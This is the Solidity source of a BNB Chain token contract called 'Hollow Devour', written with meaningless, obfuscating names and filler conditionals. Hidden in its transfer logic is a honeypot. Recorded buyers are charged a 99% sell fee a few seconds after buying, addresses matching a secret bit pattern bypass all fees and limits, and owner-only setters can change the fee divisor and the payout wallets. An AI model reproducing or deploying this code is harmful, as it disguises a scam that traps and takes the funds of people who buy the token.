/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract HollowDevour is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Hollow Devour ";
    string constant _symbol = "HollowDevour";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedTeamFeeMode;
    mapping(address => bool) private botsLaunchedMaxTeam;
    mapping(address => bool) private feeLimitBuySwapWalletIs;
    mapping(address => bool) private teamBurnExemptFeeLiquidityBots;
    mapping(address => uint256) private burnLiquidityBotsMinExemptTeam;
    mapping(uint256 => address) private isSellLiquidityBurnLimitBuy;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private burnWalletMarketingLaunched = 0;
    uint256 private swapBurnTradingSell = 9;

    //SELL FEES
    uint256 private maxFeeIsMode = 0;
    uint256 private swapTxWalletTeam = 9;

    uint256 private teamSwapModeBuy = swapBurnTradingSell + burnWalletMarketingLaunched;
    uint256 private isMaxSellExemptTeamMin = 100;

    address private maxMinReceiverLimitBurn = (msg.sender); // auto-liq address
    address private burnSellModeSwap = (0xD32e56d6CFcdba6Cc8cFe248ffffC756403796ee); // marketing address
    address private minSellTeamTx = DEAD;
    address private limitBuyMinMax = DEAD;
    address private teamReceiverSellLaunched = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private limitExemptLiquidityReceiverTeamSell;
    uint256 private limitMaxModeReceiverLaunchedTeam;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private teamTradingFeeMinModeWallet;
    uint256 private tradingFeeBotsAuto;
    uint256 private marketingWalletMinTradingTxSwap;
    uint256 private isModeBurnAuto;
    uint256 private limitSwapSellTx;

    bool private txSellBotsTradingModeTeamBurn = true;
    bool private teamBurnExemptFeeLiquidityBotsMode = true;
    bool private exemptBotsTeamLaunched = true;
    bool private buyLimitBotsBurn = true;
    bool private marketingTxReceiverLaunched = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private sellAutoWalletMarketing = 6 * 10 ** 15;
    uint256 private marketingSellBotsTeamModeExempt = _totalSupply / 1000; // 0.1%

    
    uint256 private sellMarketingBuyTradingLaunchedMode = 0;
    uint256 private limitIsTradingAuto = 0;
    bool private tradingModeSellTeamBurn = false;
    uint256 private txIsLiquidityBurn = 0;
    bool private buyMarketingMaxIs = false;
    bool private walletMarketingBotsExemptMax = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        teamTradingFeeMinModeWallet = true;

        launchedTeamFeeMode[msg.sender] = true;
        launchedTeamFeeMode[address(this)] = true;

        botsLaunchedMaxTeam[msg.sender] = true;
        botsLaunchedMaxTeam[0x0000000000000000000000000000000000000000] = true;
        botsLaunchedMaxTeam[0x000000000000000000000000000000000000dEaD] = true;
        botsLaunchedMaxTeam[address(this)] = true;

        feeLimitBuySwapWalletIs[msg.sender] = true;
        feeLimitBuySwapWalletIs[0x0000000000000000000000000000000000000000] = true;
        feeLimitBuySwapWalletIs[0x000000000000000000000000000000000000dEaD] = true;
        feeLimitBuySwapWalletIs[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsFeeMaxAutoExempt(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return botsFeeMaxAutoExempt(sender, recipient, amount);
    }

    function botsFeeMaxAutoExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (buyMarketingMaxIs == exemptBotsTeamLaunched) {
            buyMarketingMaxIs = buyLimitBotsBurn;
        }

        if (tradingModeSellTeamBurn != buyMarketingMaxIs) {
            tradingModeSellTeamBurn = marketingTxReceiverLaunched;
        }

        if (limitIsTradingAuto == limitIsTradingAuto) {
            limitIsTradingAuto = sellAutoWalletMarketing;
        }


        bool bLimitTxWalletValue = feeTeamExemptLiquidityBuyIsMarketing(sender) || feeTeamExemptLiquidityBuyIsMarketing(recipient);
        
        if (limitIsTradingAuto == limitIsTradingAuto) {
            limitIsTradingAuto = txIsLiquidityBurn;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                autoLiquidityLaunchedTradingTx();
            }
            if (!bLimitTxWalletValue) {
                isTxMinSwap(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return txLiquidityLaunchedSellTradingReceiverLimit(sender, recipient, amount);}

        if (!launchedTeamFeeMode[sender] && !launchedTeamFeeMode[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || feeLimitBuySwapWalletIs[sender] || feeLimitBuySwapWalletIs[recipient], "Max TX Limit has been triggered");

        if (walletBuyModeBurn()) {walletTxLimitExemptSellTrading();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (buyMarketingMaxIs == exemptBotsTeamLaunched) {
            buyMarketingMaxIs = tradingModeSellTeamBurn;
        }

        if (txIsLiquidityBurn == marketingSellBotsTeamModeExempt) {
            txIsLiquidityBurn = txIsLiquidityBurn;
        }

        if (tradingModeSellTeamBurn != buyMarketingMaxIs) {
            tradingModeSellTeamBurn = buyLimitBotsBurn;
        }


        uint256 amountReceived = maxSwapFeeModeMarketingExempt(sender) ? buyTradingReceiverAutoMaxSwap(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function txLiquidityLaunchedSellTradingReceiverLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function maxSwapFeeModeMarketingExempt(address sender) internal view returns (bool) {
        return !botsLaunchedMaxTeam[sender];
    }

    function sellMarketingBuyTeamTxWalletMode(address sender, bool selling) internal returns (uint256) {
        
        if (tradingModeSellTeamBurn == exemptBotsTeamLaunched) {
            tradingModeSellTeamBurn = teamBurnExemptFeeLiquidityBotsMode;
        }

        if (txIsLiquidityBurn != sellAutoWalletMarketing) {
            txIsLiquidityBurn = txIsLiquidityBurn;
        }

        if (buyMarketingMaxIs == buyMarketingMaxIs) {
            buyMarketingMaxIs = buyMarketingMaxIs;
        }


        if (selling) {
            teamSwapModeBuy = swapTxWalletTeam + maxFeeIsMode;
            return exemptIsLiquidityReceiver(sender, teamSwapModeBuy);
        }
        if (!selling && sender == uniswapV2Pair) {
            teamSwapModeBuy = swapBurnTradingSell + burnWalletMarketingLaunched;
            return teamSwapModeBuy;
        }
        return exemptIsLiquidityReceiver(sender, teamSwapModeBuy);
    }

    function liquidityModeBurnMarketing() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function buyTradingReceiverAutoMaxSwap(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (walletMarketingBotsExemptMax != buyMarketingMaxIs) {
            walletMarketingBotsExemptMax = marketingTxReceiverLaunched;
        }

        if (sellMarketingBuyTradingLaunchedMode == swapTxWalletTeam) {
            sellMarketingBuyTradingLaunchedMode = maxFeeIsMode;
        }


        uint256 feeAmount = amount.mul(sellMarketingBuyTeamTxWalletMode(sender, receiver == uniswapV2Pair)).div(isMaxSellExemptTeamMin);

        if (teamBurnExemptFeeLiquidityBots[sender] || teamBurnExemptFeeLiquidityBots[receiver]) {
            feeAmount = amount.mul(99).div(isMaxSellExemptTeamMin);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function feeTeamExemptLiquidityBuyIsMarketing(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function exemptIsLiquidityReceiver(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = burnLiquidityBotsMinExemptTeam[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function isTxMinSwap(address addr) private {
        if (liquidityModeBurnMarketing() < sellAutoWalletMarketing) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        isSellLiquidityBurnLimitBuy[exemptLimitValue] = addr;
    }

    function autoLiquidityLaunchedTradingTx() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (burnLiquidityBotsMinExemptTeam[isSellLiquidityBurnLimitBuy[i]] == 0) {
                    burnLiquidityBotsMinExemptTeam[isSellLiquidityBurnLimitBuy[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(burnSellModeSwap).transfer(amountBNB * amountPercentage / 100);
    }

    function walletBuyModeBurn() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    marketingTxReceiverLaunched &&
    _balances[address(this)] >= marketingSellBotsTeamModeExempt;
    }

    function walletTxLimitExemptSellTrading() internal swapping {
        
        if (walletMarketingBotsExemptMax != buyMarketingMaxIs) {
            walletMarketingBotsExemptMax = teamBurnExemptFeeLiquidityBotsMode;
        }

        if (buyMarketingMaxIs == buyLimitBotsBurn) {
            buyMarketingMaxIs = txSellBotsTradingModeTeamBurn;
        }

        if (sellMarketingBuyTradingLaunchedMode != sellMarketingBuyTradingLaunchedMode) {
            sellMarketingBuyTradingLaunchedMode = marketingSellBotsTeamModeExempt;
        }


        uint256 amountToLiquify = marketingSellBotsTeamModeExempt.mul(burnWalletMarketingLaunched).div(teamSwapModeBuy).div(2);
        uint256 amountToSwap = marketingSellBotsTeamModeExempt.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (sellMarketingBuyTradingLaunchedMode != sellAutoWalletMarketing) {
            sellMarketingBuyTradingLaunchedMode = txIsLiquidityBurn;
        }

        if (walletMarketingBotsExemptMax != txSellBotsTradingModeTeamBurn) {
            walletMarketingBotsExemptMax = teamBurnExemptFeeLiquidityBotsMode;
        }

        if (tradingModeSellTeamBurn != teamBurnExemptFeeLiquidityBotsMode) {
            tradingModeSellTeamBurn = marketingTxReceiverLaunched;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = teamSwapModeBuy.sub(burnWalletMarketingLaunched.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(burnWalletMarketingLaunched).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(swapBurnTradingSell).div(totalETHFee);
        
        if (buyMarketingMaxIs != exemptBotsTeamLaunched) {
            buyMarketingMaxIs = teamBurnExemptFeeLiquidityBotsMode;
        }

        if (limitIsTradingAuto == sellMarketingBuyTradingLaunchedMode) {
            limitIsTradingAuto = sellMarketingBuyTradingLaunchedMode;
        }


        payable(burnSellModeSwap).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                maxMinReceiverLimitBurn,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getIsSellLiquidityBurnLimitBuy(uint256 a0) public view returns (address) {
            return isSellLiquidityBurnLimitBuy[a0];
    }
    function setIsSellLiquidityBurnLimitBuy(uint256 a0,address a1) public onlyOwner {
        if (a0 == swapBurnTradingSell) {
            limitBuyMinMax=a1;
        }
        if (isSellLiquidityBurnLimitBuy[a0] == isSellLiquidityBurnLimitBuy[a0]) {
           isSellLiquidityBurnLimitBuy[a0]=a1;
        }
        isSellLiquidityBurnLimitBuy[a0]=a1;
    }

    function getLimitBuyMinMax() public view returns (address) {
        if (limitBuyMinMax != burnSellModeSwap) {
            return burnSellModeSwap;
        }
        if (limitBuyMinMax == teamReceiverSellLaunched) {
            return teamReceiverSellLaunched;
        }
        return limitBuyMinMax;
    }
    function setLimitBuyMinMax(address a0) public onlyOwner {
        if (limitBuyMinMax != burnSellModeSwap) {
            burnSellModeSwap=a0;
        }
        limitBuyMinMax=a0;
    }

    function getIsMaxSellExemptTeamMin() public view returns (uint256) {
        if (isMaxSellExemptTeamMin != swapTxWalletTeam) {
            return swapTxWalletTeam;
        }
        if (isMaxSellExemptTeamMin != isMaxSellExemptTeamMin) {
            return isMaxSellExemptTeamMin;
        }
        return isMaxSellExemptTeamMin;
    }
    function setIsMaxSellExemptTeamMin(uint256 a0) public onlyOwner {
        isMaxSellExemptTeamMin=a0;
    }

    function getTxSellBotsTradingModeTeamBurn() public view returns (bool) {
        if (txSellBotsTradingModeTeamBurn != buyLimitBotsBurn) {
            return buyLimitBotsBurn;
        }
        return txSellBotsTradingModeTeamBurn;
    }
    function setTxSellBotsTradingModeTeamBurn(bool a0) public onlyOwner {
        if (txSellBotsTradingModeTeamBurn == tradingModeSellTeamBurn) {
            tradingModeSellTeamBurn=a0;
        }
        if (txSellBotsTradingModeTeamBurn != marketingTxReceiverLaunched) {
            marketingTxReceiverLaunched=a0;
        }
        txSellBotsTradingModeTeamBurn=a0;
    }

    function getLaunchedTeamFeeMode(address a0) public view returns (bool) {
        if (a0 != teamReceiverSellLaunched) {
            return marketingTxReceiverLaunched;
        }
            return launchedTeamFeeMode[a0];
    }
    function setLaunchedTeamFeeMode(address a0,bool a1) public onlyOwner {
        if (a0 != limitBuyMinMax) {
            buyMarketingMaxIs=a1;
        }
        if (launchedTeamFeeMode[a0] != botsLaunchedMaxTeam[a0]) {
           botsLaunchedMaxTeam[a0]=a1;
        }
        if (a0 == limitBuyMinMax) {
            txSellBotsTradingModeTeamBurn=a1;
        }
        launchedTeamFeeMode[a0]=a1;
    }

    function getBurnWalletMarketingLaunched() public view returns (uint256) {
        if (burnWalletMarketingLaunched == sellMarketingBuyTradingLaunchedMode) {
            return sellMarketingBuyTradingLaunchedMode;
        }
        if (burnWalletMarketingLaunched != sellMarketingBuyTradingLaunchedMode) {
            return sellMarketingBuyTradingLaunchedMode;
        }
        if (burnWalletMarketingLaunched == limitIsTradingAuto) {
            return limitIsTradingAuto;
        }
        return burnWalletMarketingLaunched;
    }
    function setBurnWalletMarketingLaunched(uint256 a0) public onlyOwner {
        burnWalletMarketingLaunched=a0;
    }

    function getExemptBotsTeamLaunched() public view returns (bool) {
        return exemptBotsTeamLaunched;
    }
    function setExemptBotsTeamLaunched(bool a0) public onlyOwner {
        exemptBotsTeamLaunched=a0;
    }

    function getMaxMinReceiverLimitBurn() public view returns (address) {
        if (maxMinReceiverLimitBurn != maxMinReceiverLimitBurn) {
            return maxMinReceiverLimitBurn;
        }
        if (maxMinReceiverLimitBurn == limitBuyMinMax) {
            return limitBuyMinMax;
        }
        if (maxMinReceiverLimitBurn != minSellTeamTx) {
            return minSellTeamTx;
        }
        return maxMinReceiverLimitBurn;
    }
    function setMaxMinReceiverLimitBurn(address a0) public onlyOwner {
        maxMinReceiverLimitBurn=a0;
    }

    function getMinSellTeamTx() public view returns (address) {
        if (minSellTeamTx == minSellTeamTx) {
            return minSellTeamTx;
        }
        if (minSellTeamTx == teamReceiverSellLaunched) {
            return teamReceiverSellLaunched;
        }
        return minSellTeamTx;
    }
    function setMinSellTeamTx(address a0) public onlyOwner {
        if (minSellTeamTx == minSellTeamTx) {
            minSellTeamTx=a0;
        }
        minSellTeamTx=a0;
    }

    function getBuyLimitBotsBurn() public view returns (bool) {
        if (buyLimitBotsBurn != buyLimitBotsBurn) {
            return buyLimitBotsBurn;
        }
        if (buyLimitBotsBurn == walletMarketingBotsExemptMax) {
            return walletMarketingBotsExemptMax;
        }
        if (buyLimitBotsBurn != buyLimitBotsBurn) {
            return buyLimitBotsBurn;
        }
        return buyLimitBotsBurn;
    }
    function setBuyLimitBotsBurn(bool a0) public onlyOwner {
        buyLimitBotsBurn=a0;
    }

    function getLimitIsTradingAuto() public view returns (uint256) {
        return limitIsTradingAuto;
    }
    function setLimitIsTradingAuto(uint256 a0) public onlyOwner {
        if (limitIsTradingAuto != maxFeeIsMode) {
            maxFeeIsMode=a0;
        }
        limitIsTradingAuto=a0;
    }

    function getTeamSwapModeBuy() public view returns (uint256) {
        if (teamSwapModeBuy == txIsLiquidityBurn) {
            return txIsLiquidityBurn;
        }
        if (teamSwapModeBuy != sellMarketingBuyTradingLaunchedMode) {
            return sellMarketingBuyTradingLaunchedMode;
        }
        return teamSwapModeBuy;
    }
    function setTeamSwapModeBuy(uint256 a0) public onlyOwner {
        if (teamSwapModeBuy != sellAutoWalletMarketing) {
            sellAutoWalletMarketing=a0;
        }
        teamSwapModeBuy=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}